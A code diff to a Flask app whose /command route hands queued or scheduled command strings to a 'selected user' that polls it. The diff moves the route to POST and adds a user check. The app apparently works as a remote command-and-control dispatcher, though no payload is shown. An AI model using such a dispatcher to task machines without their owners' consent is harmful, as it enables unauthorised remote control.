@@ -1,4 +1,3 @@
-
 import os
 from time import time
 from flask import Flask, render_template, request, redirect, jsonify
@@ -72,51 +71,43 @@ def command():
     global startTime
     global selected_user
     global spam
-    if request.method == "GET":
-        
-        # Ensure `startTime` is initialized for the user
-        startTime = time()
-        cmd = ""
-        message_file = os.path.join(STATIC_FOLDER, "message.txt")
-        tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
+    if request.method == "POST":
+        user = request.get_json()
+        user = user.get("user")
+        if selected_user == user:
+            startTime = time()
+            cmd = ""
+            message_file = os.path.join(STATIC_FOLDER, "message.txt")
+            tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
 
-        # Check if message file exists and read its content
-        if os.path.exists(message_file):
-            with open(message_file, "r") as file:
-                cmd = file.read()
+            if os.path.exists(message_file):
+                with open(message_file, "r") as file:
+                    cmd = file.read()
 
-        if cmd == "":
-            # If no command is found, check tasks in the JSON file
-            if os.path.exists(tasks_file):
-                with open(tasks_file, "r") as file:
-                    tasks = json.load(file)
+            if cmd == "":
+                if os.path.exists(tasks_file):
+                    with open(tasks_file, "r") as file:
+                        tasks = json.load(file)
+                    tasks_to_delete = None
+                    for task in tasks["tasks"]:
+                        exe = datetime.strptime(task["execution_time"], "%d-%m-%Y %H:%M")
+                        exe = exe.strftime("%d-%m-%Y %H:%M")
+                        now = datetime.now(timezone).strftime("%d-%m-%Y %H:%M")
+                        if exe <= now:
+                            cmd = task["cmd"]
+                            tasks_to_delete = task["id"]
+                            break
+                    if tasks_to_delete is not None:
+                        tasks["tasks"] = [task for task in tasks["tasks"] if task["id"] != tasks_to_delete]
+                        with open(tasks_file, "w") as file:
+                            json.dump(tasks, file, indent=4)
 
-                tasks_to_delete = None
-                for task in tasks["tasks"]:
-                    exe = datetime.strptime(task["execution_time"], "%d-%m-%Y %H:%M")
-                    exe = exe.strftime("%d-%m-%Y %H:%M")
-                    now = datetime.now(timezone).strftime("%d-%m-%Y %H:%M")
-
-                    # Find the task that is ready to execute
-                    if exe <= now:
-                        cmd = task["cmd"]
-                        tasks_to_delete = task["id"]
-                        break
-
-                # Remove executed tasks from the JSON file
-                if tasks_to_delete is not None:
-                    tasks["tasks"] = [task for task in tasks["tasks"] if task["id"] != tasks_to_delete]
-                    with open(tasks_file, "w") as file:
-                        json.dump(tasks, file, indent=4)
-
-        # Clear the message file if not spamming
-        if not spam:
-            with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
-                file.write("")
+            if not spam:
+                with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
+                    file.write("")
 
         return cmd if cmd else "none"
     return "none"
-
 
 @app.route("/audio", methods=["POST", "GET"])
 def sounds():
@@ -270,14 +261,11 @@ def change_user():
     user = data.get("user")
     selected_user = str(user)
     print(selected_user)
-    with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
-        file.write("")
     with open(os.path.join(STATIC_FOLDER, "users.json"), "r") as file:
         target = json.load(file)
     target["selected"] = selected_user
     with open(os.path.join(STATIC_FOLDER, "users.json"), "w") as file:
         json.dump(target, file, indent=4)
-       
     return "done"
 
 
